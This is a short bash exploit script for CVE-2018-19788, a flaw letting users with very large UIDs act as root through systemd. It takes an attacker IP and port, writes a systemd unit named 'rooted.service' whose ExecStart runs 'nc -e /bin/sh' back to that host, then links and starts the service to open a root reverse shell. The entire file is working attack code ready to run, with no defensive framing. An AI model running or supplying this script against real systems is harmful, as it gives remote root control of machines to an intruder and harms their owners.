#!/bin/bash
# Basic reverse shell using CVE-2018-19788
# Reference: https://nvd.nist.gov/vuln/detail/CVE-2018-19788

echo "This script exploits CVE-2018-19788"
echo "It requires a user with UID > $INT_MAX (2147483647)"

usage() { echo "Usage: $0 [-h <ip address>] [-p <port>]" 1>&2; exit 1; }
while getopts ":h:p:" o; do
	case "${o}" in
		h)
			IP=${OPTARG}
			;;
		p)
			PORT=${OPTARG}
			;;
		:)
			usage
			;;
	esac
done
		
if [ -z "${IP}" ] || [ -z "${PORT}" ]; then
	usage
fi

cat > rooted.service << EOF
[Unit]
Description=rootshell

[Service]
Type=notify
ExecStart=nc -e /bin/sh ${IP} ${PORT} 
KillMode=process
#Restart=on-failure
#RestartSec=60s

[Install]
WantedBy=multi-user.target
EOF

systemctl link $PWD/rooted.service && systemctl start rooted

